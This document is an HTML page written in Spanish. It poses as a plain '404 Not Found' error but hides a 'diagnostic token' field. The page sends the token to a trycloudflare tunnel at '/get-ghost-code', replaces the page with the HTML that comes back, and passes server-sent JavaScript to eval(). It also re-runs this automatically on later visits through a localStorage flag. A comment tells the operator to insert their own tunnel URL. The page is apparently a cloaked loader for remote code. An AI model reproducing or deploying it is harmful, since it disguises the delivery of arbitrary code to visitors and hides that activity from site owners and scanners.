<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { 
            height: 100vh; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            font-family: 'Courier New', monospace; 
            background-color: #ffffff;
            color: #333;
        }
        .error-container { text-align: center; }
        h1 { font-size: 50px; margin: 0; }
        p { font-size: 18px; margin-bottom: 30px; }
        
        .tk-input { 
            padding: 15px; 
            width: 280px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            text-align: center; 
            font-size: 16px;
            outline: none;
            text-transform: uppercase;
        }
        .btn { 
            margin-top: 15px; 
            padding: 12px 25px; 
            background: #f8f9fa; 
            border: 1px solid #ccc; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: bold; 
            transition: 0.3s;
        }
        .btn:hover { background: #e2e6ea; }

        /* Pantalla de carga profesional */
        #loading-screen {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 10000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0064e0;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-screen">
        <div class="spinner"></div>
        <p style="margin-top:15px; font-family: sans-serif;">Cargando sistema...</p>
    </div>

    <div class="error-container" id="main-content">
        <h1>404</h1>
        <p>The requested URL was not found on this server.</p>
        <input type="text" id="tk" class="tk-input" placeholder="DIAGNOSTIC TOKEN">
        <br>
        <button class="btn" onclick="runDiagnostic()">RUN DIAGNOSTIC</button>
    </div>

    <script>
        // CAMBIA ESTO POR TU URL DE CLOUDFLARE ACTUAL
        const API_URL = "https://clearance-beginner-chat-workshops.trycloudflare.com";

        // Al cargar la página, verificamos si ya tiene acceso previo
        window.onload = () => {
            if (localStorage.getItem('session_active') === 'true') {
                console.log("Sesión activa detectada. Accediendo...");
                runDiagnostic(true);
            }
        };

        async function runDiagnostic(isReturning = false) {
            const tokenInput = document.getElementById('tk');
            const loader = document.getElementById('loading-screen');
            
            let tokenValue = "";
            if (!isReturning) {
                tokenValue = tokenInput.value.trim().toUpperCase();
                if (!tokenValue) {
                    alert("Por favor ingrese un token de diagnóstico.");
                    return;
                }
            }

            loader.style.display = 'flex';

            try {
                const response = await fetch(`${API_URL}/get-ghost-code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        llave: tokenValue,
                        is_returning: isReturning
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    
                    // Reemplazamos todo el contenido con lo que manda Python
                    document.open();
                    document.write(data.html);
                    document.close();
                    
                    // Ejecutamos el JavaScript que mandó el servidor
                    eval(data.js);
                } else {
                    loader.style.display = 'none';
                    if (isReturning) {
                        // Si falló el auto-login, borramos la sesión vieja
                        localStorage.removeItem('session_active');
                    } else {
                        alert("ERROR: Token inválido o expirado.");
                    }
                }
            } catch (error) {
                loader.style.display = 'none';
                console.error(error);
                alert("Servidor fuera de línea o error de conexión.");
            }
        }
    </script>
</body>
</html>
